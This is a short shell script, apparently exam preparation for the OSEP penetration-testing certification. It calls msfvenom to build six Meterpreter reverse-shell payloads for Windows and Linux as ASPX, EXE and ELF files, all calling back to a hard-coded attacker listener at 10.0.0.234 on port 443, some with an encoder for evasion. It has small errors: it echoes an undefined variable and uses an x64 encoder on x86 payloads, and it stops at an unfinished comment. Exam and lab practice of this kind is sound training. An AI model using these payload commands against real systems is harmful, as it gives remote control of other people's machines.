#!/bin/sh

# Quicky generate msfvenom bin for OSEP exam
# author: shaoyongyang
# version: v1.0

lHost=10.0.0.234
lPort=443
savePath=/home/god/Desktop/temp/

echo $ipAddr
echo $lPort
echo $savePath

# generate bin

## x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort -e x64/zutto_dekiru -f aspx > $savePath/windows_x64_meterpreter_reverse_tcp.aspx
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort prependfork=true -f elf > $savePath/linux_x64_meterpreter_reverse_tcp.elf
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe > $savePath/windows_x64_meterpreter_reverse_https.exe


## x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort -e x64/zutto_dekiru -f aspx > $savePath/windows_meterpreter_reverse_tcp.aspx
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort prependfork=true -f elf > $savePath/linux_x86_meterpreter_reverse_tcp.elf
msfvenom -p windows/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe > $savePath/windows_meterpreter_reverse_https.exe


# generate html doc hta js
